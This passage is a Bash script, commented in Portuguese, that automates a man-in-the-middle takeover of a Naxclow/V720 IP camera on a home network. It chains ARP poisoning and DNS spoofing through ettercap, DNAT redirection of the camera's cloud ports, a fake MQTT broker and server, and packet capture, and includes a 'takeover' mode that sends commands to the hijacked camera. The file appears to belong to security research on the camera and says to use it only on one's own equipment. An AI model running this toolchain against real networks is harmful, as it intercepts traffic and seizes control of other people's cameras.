#!/usr/bin/env bash
#
# mitm_dns.sh — Cenario 3: MITM STA + DNS spoof contra camera Naxclow/V720
# na rede REAL de casa. Atacante = maquina na mesma LAN (NAO e gateway).
# Roda em Kali (Linux) e no macOS.
#
# Encadeia: mosquitto + fake server (HTTP:80 / relay:29940) -> etter.dns ->
# IP forwarding -> ettercap (ARP spoof + plugin dns_spoof) -> tcpdump.
# A camera, apos power cycle, resolve *.naxclow.com pro atacante e registra
# no broker/servidor falso — takeover sem tocar na config dela.
#
# Diferenca dos outros labs:
#   - mitm/mitm_auto.sh      = interceptacao PASSIVA (so le).
#   - fakeserver/fakesrv_lab = fake server em AP isolado (atacante E gateway).
#   - este                   = fake server alcancado de dentro da LAN real.
#
# Uso:
#   sudo ./mitm_dns.sh up                 # sobe tudo (mosquitto, fake server, ettercap, pcap)
#   ./mitm_dns.sh status                  # PIDs, portas, DNAT, ARP alvo
#   ./mitm_dns.sh logs [nome] [N]         # mosquitto|mqtt|server|ettercap|pcap ; N linhas (0=tudo)
#   ./mitm_dns.sh watch [nome]            # tail -F ao vivo
#   sudo ./mitm_dns.sh dnat on|off        # fallback: desvia IPs fixos do cloud pro fake
#                                         #   (Linux: iptables DNAT | macOS: pf rdr, EXPERIMENTAL)
#   sudo ./mitm_dns.sh relay              # relay-only: desvia so 29939-29942 (MQTT/HTTP no cloud real)
#   sudo ./mitm_dns.sh takeover [cmd...]  # espera camera no MQTT, manda comandos, prova stream
#   ./mitm_dns.sh cheat                   # passos manuais (camera + PC)
#   sudo ./mitm_dns.sh bundle             # junta logs+configs num arquivo so
#   sudo ./mitm_dns.sh down               # mata tudo, restaura ARP/ip_forward/etter.dns/DNAT
#
# Overrides por env:
#   CAM_IP=192.168.0.36 (ou CAM_IP=auto p/ achar pelo OUI 5c:f1:50) GW_IP=192.168.0.1
#   IFACE=<wlan0|en0> DEV=5c001502B330
#   TAKEOVER_CMDS='ir on;reboot'  ONLINE_TIMEOUT=180  RESP_WAIT=20  STREAM_SECS=15
#   RELAY_PORT=29940
#
# Ambiente controlado / camera propria. Nao usar contra dispositivos de terceiros.
#
set -uo pipefail

OS="$(uname -s)"
IS_MAC=0; [[ "$OS" == "Darwin" ]] && IS_MAC=1

# sudo no macOS tem secure_path sem o brew — garante que ettercap/mosquitto* aparecem
(( IS_MAC )) && export PATH="/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/usr/local/sbin:$PATH"

CAM_IP="${CAM_IP:-192.168.0.36}"
GW_IP="${GW_IP:-192.168.0.1}"
IFACE="${IFACE:-$([[ $IS_MAC -eq 1 ]] && echo en0 || echo wlan0)}"
DEV="${DEV:-5c001502B330}"

# takeover — overrides por env:
TAKEOVER_CMDS="${TAKEOVER_CMDS:-ir on;reboot}"   # sequencia p/ fake_srv_cmd.sh, separada por ';'
ONLINE_TIMEOUT="${ONLINE_TIMEOUT:-180}"          # s esperando a camera aparecer no MQTT
RESP_WAIT="${RESP_WAIT:-20}"                     # s coletando a resposta da camera apos os comandos
STREAM_SECS="${STREAM_SECS:-15}"                 # s de captura do /live
P2P_WAIT="${P2P_WAIT:-30}"                       # s esperando o registro P2P (relay)
RELAY_PORT="${RELAY_PORT:-29940}"                # porta do "relay" que a camera usa p/ registrar
DNAT_TARGET="${DNAT_TARGET:-}"                    # destino do DNAT (vazio = fake local no MY_IP; setar = IP da VPS)
FAKE_SRV_RELAY_HOST="${FAKE_SRV_RELAY_HOST:-107.149.143.96}"  # IP publico do relay real (dnat desvia pro fake)
DNAT_MODE="${DNAT_MODE:-all}"                     # 'all' (80/1883/29939-29942) ou 'relay' (so 29939-29942)

# Portas do cloud desviadas pelo fallback 'dnat on' (por porta, nao por IP).
# A camera tem um pool de IPs hardcoded — redirecionar por porta cobre todos.

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
CMD_SCRIPT="$REPO_ROOT/scripts/fakeserver/fake_srv_cmd.sh"
UTILS_DIR="$REPO_ROOT/scripts/utils"
OUT_DIR="$REPO_ROOT/docs/mitm_dns_out"
LOG_DIR="$OUT_DIR"
RUN_DIR="$OUT_DIR/run"
MOSQ_CONF="$OUT_DIR/mosquitto.conf"
PCAP="$OUT_DIR/cam_dns.pcap"

PF_ANCHOR="/etc/pf.anchors/mitm_dns"
PF_CONF="/etc/pf.conf"

# ordem = ordem de subida
SERVICES=(mosquitto mqtt server ettercap pcap)

if [[ -t 1 ]]; then c_red=$'\e[31m'; c_grn=$'\e[32m'; c_yel=$'\e[33m'; c_dim=$'\e[2m'; c_rst=$'\e[0m'
else c_red=; c_grn=; c_yel=; c_dim=; c_rst=; fi
say()  { printf '%s\n' "$*"; }
ok()   { printf '%s[ok]%s %s\n' "$c_grn" "$c_rst" "$*"; }
warn() { printf '%s[!!]%s %s\n' "$c_yel" "$c_rst" "$*"; }
die()  { printf '%s[x]%s %s\n'  "$c_red" "$c_rst" "$*" >&2; exit 1; }

usage()     { sed -n '3,39p' "$0" | sed 's/^#\{1,\} \{0,1\}//'; }
need_root() { [[ $EUID -eq 0 ]] || die "precisa de root:  sudo $0 $*"; }
log_of()    { echo "$LOG_DIR/$1.log"; }
pid_of()    { echo "$RUN_DIR/$1.pid"; }

# achar binario fora do PATH (brew joga daemon em sbin; sudo tem secure_path)
find_bin() {
  command -v "$1" 2>/dev/null && return 0
  local d
  for d in /opt/homebrew/bin /opt/homebrew/sbin /usr/local/bin /usr/local/sbin; do
    [[ -x "$d/$1" ]] && { echo "$d/$1"; return 0; }
  done
  return 1
}

alive() {  # alive <nome>
  local p; p=$(cat "$(pid_of "$1")" 2>/dev/null) || return 1
  # kill -0 falha com EPERM em processo de outro usuario (status sem sudo) — cai pro ps
  [[ -n "$p" ]] && { kill -0 "$p" 2>/dev/null || ps -p "$p" >/dev/null 2>&1; }
}

# ---- wrappers por SO ----
my_ip() {
  if (( IS_MAC )); then ipconfig getifaddr "$IFACE" 2>/dev/null
  else ip -4 -brief addr show "$IFACE" 2>/dev/null | awk '{print $3}' | cut -d/ -f1 | head -1; fi
}

# $1 alcancavel DIRETO por $IFACE (mesma sub-rede, sem gateway)?
lan_ok() {
  local out
  if (( IS_MAC )); then
    out=$(route -n get "$1" 2>/dev/null) || return 1
    grep -q "interface: $IFACE" <<<"$out" || return 1
    grep -qE "gateway: [0-9]" <<<"$out" && return 1
    return 0
  else
    ip route get "$1" 2>/dev/null | grep -q "dev $IFACE" || return 1
    ! ip route get "$1" 2>/dev/null | grep -q " via "
  fi
}

port_listen() {  # port_listen 1883
  if (( IS_MAC )); then
    # sem root o lsof nao ve processo alheio — fallback pro netstat
    lsof -nP -iTCP:"$1" -sTCP:LISTEN 2>/dev/null | grep -q . \
      || netstat -an -p tcp 2>/dev/null | grep -qE "\.$1 +.*LISTEN"
  else
    ss -tlnH "sport = :$1" 2>/dev/null | grep -q .
  fi
}

wait_port() {  # wait_port <porta> [segundos]
  local port=$1 t=${2:-8} i
  for ((i=0; i<t; i++)); do port_listen "$port" && return 0; sleep 1; done
  return 1
}

fwd_sysctl() { (( IS_MAC )) && echo net.inet.ip.forwarding || echo net.ipv4.ip_forward; }

# acha a camera pelo OUI do fabricante (5c:f1:50) — DHCP muda o IP entre sessoes.
# ela ignora ICMP mas responde ARP; o ping em varredura serve pra popular o cache
discover_cam() {
  local net i
  net=$(my_ip | cut -d. -f1-3)
  [[ -n "$net" ]] || return 1
  for i in $(seq 1 254); do ping -c 1 -W 100 "$net.$i" >/dev/null 2>&1 & done
  wait
  arp -a -n 2>/dev/null | grep -i '5c:f1:50' | sed -E 's/.*\(([0-9.]+)\).*/\1/' | head -1
}

# camera online? = houve linha do $DEV no mosquitto.log nos ultimos ${1:-15}s
# (mosquitto -v prefixa cada linha com epoch: "1700000000: Received PINGREQ from <DEV>")
cam_online() {
  local win=${1:-15} now ts line
  now=$(date +%s)
  line=$(grep -aE "(from|as) ${DEV}([^0-9A-Za-z]|$)" "$(log_of mosquitto)" 2>/dev/null | tail -1)
  [[ -n "$line" ]] || return 1
  ts=${line%%:*}
  [[ "$ts" =~ ^[0-9]+$ ]] || return 1
  (( now - ts <= win ))
}

# bloqueia ate a camera aparecer no MQTT (0 = online, 1 = timeout em ONLINE_TIMEOUT)
wait_online() {
  local deadline=$(( $(date +%s) + ONLINE_TIMEOUT )) dots=0
  while (( $(date +%s) < deadline )); do
    if cam_online 15; then (( dots )) && echo; ok "camera $DEV online no MQTT"; return 0; fi
    (( dots++ )) || printf '  aguardando a camera %s conectar no MQTT (timeout %ss) ' "$DEV" "$ONLINE_TIMEOUT"
    printf '.'; sleep 2
  done
  (( dots )) && echo
  return 1
}

# descobre o <id> do stream: server.log primeiro, /dev/list como fallback
dev_stream_id() {
  local id
  id=$(grep -aoE 'registration request \(device: [^)]+\)' "$(log_of server)" 2>/dev/null \
        | tail -1 | sed -E 's/.*device: (.+)\)$/\1/')
  [[ -n "$id" ]] || id=$(grep -aoE 'Found device [A-Za-z0-9_.-]+' "$(log_of server)" 2>/dev/null \
        | tail -1 | awk '{print $3}')
  [[ -n "$id" ]] || id=$(curl -s --max-time 3 "http://127.0.0.1/dev/list" 2>/dev/null \
        | grep -oE '"uid"[[:space:]]*:[[:space:]]*"[^"]+"' | head -1 | sed -E 's/.*"([^"]+)"$/\1/')
  echo "$id"
}

# ja houve registro P2P? = server.log tem conexao aceita no relay apos o boot
p2p_registered() {
  grep -aqE "\[(TCP|UDP)-SRV :${RELAY_PORT}\] (Connected|New|Accept)" "$(log_of server)" 2>/dev/null \
    || grep -aqE "(Accept|connect|register).*:${RELAY_PORT}|Receive registration request|Found device" "$(log_of server)" 2>/dev/null
}

# ultimo Device/Info publicado pela camera no broker (proof.log ou mqtt.log)
last_dev_info() {
  local f="$1"
  grep -a 'Device/Info' "$f" 2>/dev/null | tail -1 | sed -E 's/^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9:]{8}[+-][0-9]{4}[[:space:]]+//; s/^[0-9]{10}[[:space:]]+//; s/^Naxclow\/P2P\/Users\/Device\/Info[[:space:]]+//'
}

baseline_info() {
  local f="$1" info
  info=$(last_dev_info "$f")
  [[ -n "$info" ]] || { warn "  sem Device/Info no $f ainda — a camera publica o Info so depois de conectar no broker"; return 1; }
  echo "$info" > "$OUT_DIR/takeover_${stamp}_baseline.json"
  say "  baseline Device/Info:"
  say "    $(echo "$info" | python3 -m json.tool 2>/dev/null | tr '\n' ' ' || echo "$info")"
  return 0
}

diff_info() {
  local f="$1" info base
  info=$(last_dev_info "$f")
  [[ -n "$info" ]] || { warn "  (sem Info novo pra comparar)"; return 1; }
  [[ -f "$OUT_DIR/takeover_${stamp}_baseline.json" ]] || { warn "  (sem baseline salvo)"; return 1; }
  base=$(cat "$OUT_DIR/takeover_${stamp}_baseline.json")
  say "  diff Device/Info (baseline -> depois):"
  python3 - "$base" "$info" <<'PY'
import json,sys
a=json.loads(sys.argv[1]); b=json.loads(sys.argv[2])
keys=sorted(set(a)|set(b))
for k in keys:
    va,vb=a.get(k),b.get(k)
    if va!=vb:
        print(f"    {k}: {va!r} -> {vb!r}")
PY
  return 0
}

# watchdog do registro P2P: bloqueia ate a camera abrir o canal do relay no fake
p2p_watch() {
  local deadline=$(( $(date +%s) + P2P_WAIT ))
  say "  aguardando registro P2P da camera no fake server (:${RELAY_PORT}, timeout ${P2P_WAIT}s) ..."
  while (( $(date +%s) < deadline )); do
    p2p_registered && { ok "  registro P2P visto no server.log"; return 0; }
    sleep 2
  done
  warn "  sem conexao :${RELAY_PORT} no server.log em ${P2P_WAIT}s."
  return 1
}

check_deps() {
  local miss=()
  ETTERCAP=$(find_bin ettercap)     || miss+=("ettercap")
  MOSQUITTO=$(find_bin mosquitto)   || miss+=("mosquitto")
  MOSQ_SUB=$(find_bin mosquitto_sub) || miss+=("mosquitto_sub")
  TCPDUMP=$(find_bin tcpdump)       || miss+=("tcpdump")
  for b in python3 curl; do command -v "$b" >/dev/null || miss+=("$b"); done
  if (( IS_MAC )); then
    for b in ipconfig route lsof pfctl; do command -v "$b" >/dev/null || miss+=("$b"); done
  else
    for b in iptables ip ss; do command -v "$b" >/dev/null || miss+=("$b"); done
  fi
  ((${#miss[@]})) && die "falta no PATH: ${miss[*]}
    Kali:  apt install ettercap-text-only mosquitto mosquitto-clients tcpdump curl
    macOS: brew install ettercap mosquitto"

  # no macOS o fake server roda como root mas as deps python estao no
  # site-packages DO USUARIO (~/Library/Python/3.9) — montar PYTHONPATH
  if (( IS_MAC )); then
    PYBIN=/usr/bin/python3
    PYPATH_USER=$(ls -d "/Users/${SUDO_USER:-$USER}/Library/Python/"*/lib/python/site-packages 2>/dev/null | tail -1)
    [[ -n "$PYPATH_USER" ]] || die "site-packages do usuario nao achado (pip install -r requirements.txt sem sudo primeiro)"
    PYTHONPATH="$PYPATH_USER" "$PYBIN" -c "import netifaces, xmltodict, tqdm" 2>/dev/null \
      || die "deps python faltando p/ $PYBIN: roda SEM sudo:  pip3 install -r requirements.txt"
  else
    PYBIN=python3
  fi
}

# --------------------------------------------------------------- background
start_bg() {  # start_bg <nome> <comando shell>
  local name=$1 cmd=$2
  : > "$(log_of "$name")"
  if (( IS_MAC )); then
    bash -c "$cmd" >"$(log_of "$name")" 2>&1 &     # macOS nao tem setsid(1)
  else
    setsid bash -c "$cmd" >"$(log_of "$name")" 2>&1 &
  fi
  echo $! > "$(pid_of "$name")"
}

stop_bg() {  # stop_bg <nome> [signal]
  local name=$1 sig=${2:-TERM} p
  p=$(cat "$(pid_of "$name")" 2>/dev/null) || return 0
  [[ -n "$p" ]] || return 0
  if (( IS_MAC )); then kill -"$sig" "$p" 2>/dev/null
  else kill -"$sig" -- -"$p" 2>/dev/null || kill -"$sig" "$p" 2>/dev/null; fi
  sleep 0.5
  # ettercap precisa de folga pra re-anunciar o ARP correto antes de morrer
  [[ "$sig" == INT ]] && kill -0 "$p" 2>/dev/null && sleep 2
  if (( ! IS_MAC )); then kill -KILL -- -"$p" 2>/dev/null; fi
  kill -KILL "$p" 2>/dev/null || true
  rm -f "$(pid_of "$name")"
}

# --------------------------------------------------------------- etter.dns
etter_dns_path() {
  local f
  for f in /opt/homebrew/etc/ettercap/etter.dns /etc/ettercap/etter.dns /usr/local/etc/ettercap/etter.dns; do
    [[ -f "$f" ]] && { echo "$f"; return 0; }
  done
  (( IS_MAC )) && echo /opt/homebrew/etc/ettercap/etter.dns || echo /etc/ettercap/etter.dns
}

# --------------------------------------------------------------- DNAT fallback
# Redireciona por PORTA (nao por IP) pra cobrir o pool de IPs hardcoded da camera.
# Portas do cloud: HTTP 80, MQTT 1883, relay 29939-29942 (TCP e UDP).
dnat_rules_on() {
  if (( IS_MAC )); then
    if [[ "$DNAT_MODE" == "relay" ]]; then
      cat > "$PF_ANCHOR" <<EOF
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29939 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29941 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29939 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29941 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
EOF
    else
      cat > "$PF_ANCHOR" <<EOF
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 80 -> $MY_IP port 80
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 1883 -> $MY_IP port 1883
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29939 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29941 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29939 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29941 -> $MY_IP port $RELAY_PORT
rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
EOF
    fi
    if ! grep -q 'rdr-anchor "mitm_dns"' "$PF_CONF"; then
      cp -n "$PF_CONF" "$OUT_DIR/pf.conf.bak"
      sed -i '' '/^rdr-anchor "com.apple\/\*"/a\
rdr-anchor "mitm_dns"
' "$PF_CONF"
      printf '\nload anchor "mitm_dns" from "%s"\n' "$PF_ANCHOR" >> "$PF_CONF"
    fi
    pfctl -f "$PF_CONF" >/dev/null 2>&1 || die "pfctl recusou o pf.conf — restaura de $OUT_DIR/pf.conf.bak"
    if ! pfctl -s info 2>/dev/null | grep -q "Status: Enabled"; then
      pfctl -e >/dev/null 2>&1 && touch "$RUN_DIR/pf_we_enabled"
    fi
  else
    local dnat_host="${DNAT_TARGET:-$MY_IP}"
    local specs=("tcp 29939 $RELAY_PORT" "tcp 29940 $RELAY_PORT" "tcp 29941 $RELAY_PORT" "tcp 29942 $RELAY_PORT" "udp 29939 $RELAY_PORT" "udp 29940 $RELAY_PORT" "udp 29941 $RELAY_PORT" "udp 29942 $RELAY_PORT")
    [[ "$DNAT_MODE" == "relay" ]] || specs=("tcp 80 80" "tcp 1883 1883" "${specs[@]}")
    local spec proto dport toport
    for spec in "${specs[@]}"; do
      read -r proto dport toport <<< "$spec"
      iptables -t nat -C PREROUTING -p "$proto" -s "$CAM_IP" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$dnat_host:$toport" 2>/dev/null \
        || iptables -t nat -A PREROUTING -p "$proto" -s "$CAM_IP" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$dnat_host:$toport"
    done
    echo "$CAM_IP" > "$RUN_DIR/dnat_cam_ip"
  fi
}

dnat_rules_off() {
  if (( IS_MAC )); then
    if [[ -f "$OUT_DIR/pf.conf.bak" ]]; then
      cp -f "$OUT_DIR/pf.conf.bak" "$PF_CONF"
    else
      sed -i '' '/rdr-anchor "mitm_dns"/d; /load anchor "mitm_dns"/d' "$PF_CONF" 2>/dev/null || true
    fi
    rm -f "$PF_ANCHOR"
    pfctl -f "$PF_CONF" >/dev/null 2>&1 || true
    # so desliga o pf se fomos NOS que ligamos
    [[ -f "$RUN_DIR/pf_we_enabled" ]] && { pfctl -d >/dev/null 2>&1; rm -f "$RUN_DIR/pf_we_enabled"; }
  else
    local cam dnat_host spec proto dport toport
    cam="${CAM_IP}"
    [[ -f "$RUN_DIR/dnat_cam_ip" ]] && cam=$(cat "$RUN_DIR/dnat_cam_ip")
    dnat_host="${DNAT_TARGET:-$MY_IP}"
    for spec in "tcp 80 80" "tcp 1883 1883" "tcp 29939 $RELAY_PORT" "tcp 29940 $RELAY_PORT" "tcp 29941 $RELAY_PORT" "tcp 29942 $RELAY_PORT" "udp 29939 $RELAY_PORT" "udp 29940 $RELAY_PORT" "udp 29941 $RELAY_PORT" "udp 29942 $RELAY_PORT"; do
      read -r proto dport toport <<< "$spec"
      iptables -t nat -D PREROUTING -p "$proto" -s "$cam" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$dnat_host:$toport" 2>/dev/null || true
    done
    rm -f "$RUN_DIR/dnat_cam_ip"
  fi
}

dnat_active() {
  if (( IS_MAC )); then
    pfctl -a mitm_dns -s nat 2>/dev/null | grep -q rdr
  else
    iptables -t nat -C PREROUTING -p tcp -s "$CAM_IP" ! -d "$MY_IP" --dport 80 -j DNAT --to "$MY_IP:80" 2>/dev/null
  fi
}

# --------------------------------------------------------------- configs
write_configs() {
  mkdir -p "$OUT_DIR" "$RUN_DIR"

  cat > "$MOSQ_CONF" <<EOF
listener 1883 0.0.0.0
allow_anonymous true
EOF

  ETTER_DNS="$(etter_dns_path)"
  mkdir -p "$(dirname "$ETTER_DNS")"
  [[ -f "$ETTER_DNS" ]] && cp -n "$ETTER_DNS" "$OUT_DIR/etter.dns.bak"
  cat >> "$ETTER_DNS" <<EOF

# mitm_dns.sh — cenario 3 (remover com 'down')
naxclow.com A $MY_IP
*.naxclow.com A $MY_IP
naxclow.com.cn A $MY_IP
*.naxclow.com.cn A $MY_IP
EOF
}

restore_etter_dns() {
  ETTER_DNS="$(etter_dns_path)"
  if [[ -f "$OUT_DIR/etter.dns.bak" ]]; then
    cp -f "$OUT_DIR/etter.dns.bak" "$ETTER_DNS"
  elif [[ -f "$ETTER_DNS" ]]; then
    if (( IS_MAC )); then sed -i '' '/mitm_dns.sh/,/naxclow.com.cn A/d' "$ETTER_DNS" 2>/dev/null || true
    else sed -i '/mitm_dns.sh/,/naxclow.com.cn A/d' "$ETTER_DNS" 2>/dev/null || true; fi
  fi
}

# --------------------------------------------------------------- up
cmd_up() {
  check_deps
  local running=0 s
  for s in "${SERVICES[@]}"; do alive "$s" && running=1; done
  (( running )) && die "lab ja parece no ar ('$0 status'). '$0 down' primeiro."

  # IP proprio na interface
  MY_IP=$(my_ip)
  [[ -n "$MY_IP" ]] || die "interface '$IFACE' sem IPv4 — conecta na WiFi de casa primeiro (IFACE certo?)"

  # CAM_IP=auto: descobre pelo OUI (DHCP muda o IP da camera entre sessoes)
  if [[ "$CAM_IP" == auto ]]; then
    say "procurando a camera pelo OUI 5c:f1:50 (varredura ARP na sub-rede) ..."
    CAM_IP=$(discover_cam)
    [[ -n "$CAM_IP" ]] || die "camera nao achada no ARP (OUI 5c:f1:50) — ela esta ligada e na mesma WiFi?"
    ok "camera achada: $CAM_IP"
  fi

  # mesma sub-rede da camera? (rota direta, sem gateway)
  lan_ok "$CAM_IP" || die "camera $CAM_IP nao e alcancavel direto por $IFACE (ou sai via gateway) — mesma LAN? IFACE certo?"

  # camera nao responde ICMP (ver achados_sta) — checar ARP, nao ping
  if (( IS_MAC )); then arp -n "$CAM_IP" 2>/dev/null | grep -q incomplete || true; fi

  # Application Firewall do macOS bloqueia inbound pro :80/:1883
  if (( IS_MAC )); then
    local fw; fw=$(defaults read /Library/Preferences/com.apple.alf globalstate 2>/dev/null || echo 0)
    [[ "$fw" != "0" ]] && warn "Application Firewall LIGADO (globalstate=$fw) — pode bloquear a camera chegando no :80/:1883. Desliga em Ajustes > Rede > Firewall."
  fi

  echo "=================================================================="
  echo " MITM ATIVO + DNS SPOOF  ($OS)"
  echo "   camera  (alvo)  : $CAM_IP"
  echo "   gateway (alvo)  : $GW_IP"
  echo "   atacante (eu)   : $MY_IP  ($IFACE)"
  echo "   fake server     : HTTP :80 + relay :$RELAY_PORT  (FAKE_SRV_HOST=$MY_IP)"
  echo "   broker MQTT     : :1883"
  echo "   saida           : $OUT_DIR/"
  echo "=================================================================="
  echo " So prosseguir se ESTE equipamento e ESTA rede sao teus / autorizados."
  read -r -p " Digitar 'SIM' para continuar: " CONFIRM
  [[ "$CONFIRM" == "SIM" ]] || { echo "abortado."; exit 1; }

  write_configs

  say "[1/5] mosquitto (broker MQTT) -> $(log_of mosquitto)"
  (( IS_MAC )) || systemctl stop mosquitto 2>/dev/null
  pkill -x mosquitto 2>/dev/null; sleep 1
  port_listen 1883 && die "porta 1883 ja ocupada por outro processo — mata antes (lsof -iTCP:1883)"
  start_bg mosquitto "'$MOSQUITTO' -v -c '$MOSQ_CONF'"
  sleep 1
  port_listen 1883 && ok "mosquitto LISTEN :1883" || warn "mosquitto nao subiu em :1883 — '$0 logs mosquitto'"
  start_bg mqtt "exec '$MOSQ_SUB' -h $MY_IP -t '#' -v"

  say "[2/5] fake server -> $(log_of server)"
  if (( IS_MAC )); then
    start_bg server "cd '$REPO_ROOT' && PYTHONPATH='$PYPATH_USER' BROKER=$MY_IP FAKE_SRV_HOST=$MY_IP FAKE_SRV_RELAY_HOST=$FAKE_SRV_RELAY_HOST RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
  else
    start_bg server "cd '$REPO_ROOT' && BROKER=$MY_IP FAKE_SRV_HOST=$MY_IP FAKE_SRV_RELAY_HOST=$FAKE_SRV_RELAY_HOST RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
  fi
  sleep 1
  wait_port 80 10 && ok "fake server HTTP LISTEN :80" || warn "fake server HTTP nao subiu em :80 — '$0 logs server'"
  wait_port "$RELAY_PORT" 10 && ok "fake server relay LISTEN :$RELAY_PORT" || warn "fake server relay nao subiu em :$RELAY_PORT — '$0 logs server'"

  say "[3/5] etter.dns ($ETTER_DNS): *.naxclow.com[.cn] -> $MY_IP"

  say "[4/5] IP forwarding + ettercap (ARP spoof + dns_spoof) -> $(log_of ettercap)"
  ORIG_FWD=$(sysctl -n "$(fwd_sysctl)")
  echo "$ORIG_FWD" > "$RUN_DIR/orig_ip_forward"
  sysctl -w "$(fwd_sysctl)=1" >/dev/null
  start_bg ettercap "'$ETTERCAP' -T -q -i '$IFACE' -P dns_spoof -M arp:remote '/$CAM_IP//' '/$GW_IP//'"
  sleep 4
  alive ettercap || { say; tail -n 15 "$(log_of ettercap)" | sed 's/^/    /'; die "ettercap morreu no arranque (plugin dns_spoof presente? ver log acima)"; }
  ok "ettercap envenenando ARP (camera <-> gateway) e spoofando DNS"

  say "[5/5] captura -> $PCAP (so host $CAM_IP)"
  start_bg pcap "exec '$TCPDUMP' -i '$IFACE' -n -U host '$CAM_IP' -w '$PCAP'"

  echo
  ok "tudo no ar. Agora: POWER CYCLE na camera (tirar/recolocar da tomada)."
  say "   ver ao vivo:   $0 watch"
  say "   checkpoints:   $0 logs server     (HTTP getA9ConfCheck da camera)"
  say "                  $0 logs mosquitto  (New client ... as $DEV)"
  say "   se MQTT nao registrar (IP fixo do cloud):  sudo $0 dnat on   + power cycle de novo"
  say "   takeover:      sudo $0 takeover        (depois da camera registrar)"
  say "   derrubar:      sudo $0 down"
}

# --------------------------------------------------------------- down
cmd_down() {
  say "derrubando ..."
  MY_IP=$(my_ip)

  # ettercap com INT: re-anuncia o ARP correto antes de morrer
  stop_bg ettercap INT
  sleep 2
  for s in pcap mqtt server mosquitto proof; do stop_bg "$s"; done
  pkill -f 'ettercap.*dns_spoof'          2>/dev/null
  pkill -f 'mosquitto -v -c .*mitm_dns'   2>/dev/null
  pkill -f 'a9_naxclow.py'                2>/dev/null
  pkill -f 'fake_srv_cmd.sh listen'       2>/dev/null
  pkill -f "tcpdump -i $IFACE -n -U"      2>/dev/null

  restore_etter_dns
  [[ -n "$MY_IP" ]] && dnat_rules_off

  if [[ -f "$RUN_DIR/orig_ip_forward" ]]; then
    sysctl -w "$(fwd_sysctl)=$(cat "$RUN_DIR/orig_ip_forward")" >/dev/null 2>&1
    rm -f "$RUN_DIR/orig_ip_forward"
  fi

  ok "rede restaurada (ARP normaliza sozinho; etter.dns e ip_forward revertidos). Logs em $LOG_DIR/"
}

# --------------------------------------------------------------- dnat
cmd_dnat() {
  MY_IP=$(my_ip)
  [[ -n "$MY_IP" ]] || die "interface '$IFACE' sem IPv4"
  mkdir -p "$RUN_DIR"
  if [[ "$CAM_IP" == auto ]]; then
    say "procurando a camera pelo OUI 5c:f1:50 ..."
    CAM_IP=$(discover_cam)
    [[ -n "$CAM_IP" ]] || die "camera nao achada no ARP (OUI 5c:f1:50)"
    ok "camera achada: $CAM_IP"
  fi
  case "${1:-}" in
    on)
      (( IS_MAC )) && warn "no macOS o fallback usa pf rdr (EXPERIMENTAL) — regras em $PF_ANCHOR, anchor no $PF_CONF"
      dnat_rules_on
      ok "DNAT ativo (por porta): 80/1883/29939-29942 -> ${DNAT_TARGET:-$MY_IP} (cobre o pool de IPs hardcoded)"
      say "    (o ARP spoof ja faz o trafego da camera passar por aqui)"
      say "    power cycle na camera pra ela refazer as conexoes."
      ;;
    off)
      dnat_rules_off
      ok "DNAT removido."
      ;;
    *) die "uso: $0 dnat on|off" ;;
  esac
}

# --------------------------------------------------------------- relay-only
# ARP spoof + DNAT so do relay (29939-29942). MQTT/HTTP da camera continuam no
# cloud real, entao o app real dispara o viewer e a camera cai no fake relay.
cmd_relay() {
  check_deps
  local running=0 s
  for s in server ettercap pcap; do alive "$s" && running=1; done
  (( running )) && die "lab ja parece no ar ('$0 status'). '$0 down' primeiro."

  MY_IP=$(my_ip)
  [[ -n "$MY_IP" ]] || die "interface '$IFACE' sem IPv4"

  if [[ "$CAM_IP" == auto ]]; then
    say "procurando a camera pelo OUI 5c:f1:50 ..."
    CAM_IP=$(discover_cam)
    [[ -n "$CAM_IP" ]] || die "camera nao achada no ARP (OUI 5c:f1:50)"
    ok "camera achada: $CAM_IP"
  fi

  DNAT_MODE=relay
  mkdir -p "$OUT_DIR" "$RUN_DIR"

  echo "=================================================================="
  echo " MITM RELAY-ONLY  ($OS)"
  echo "   camera   : $CAM_IP"
  echo "   gateway  : $GW_IP"
  echo "   atacante : $MY_IP  ($IFACE)"
  echo "   fake relay : :$RELAY_PORT"
  echo "   DNAT     : so 29939-29942 -> ${DNAT_TARGET:-$MY_IP}:$RELAY_PORT"
  echo "   MQTT/HTTP da camera continuam no cloud REAL"
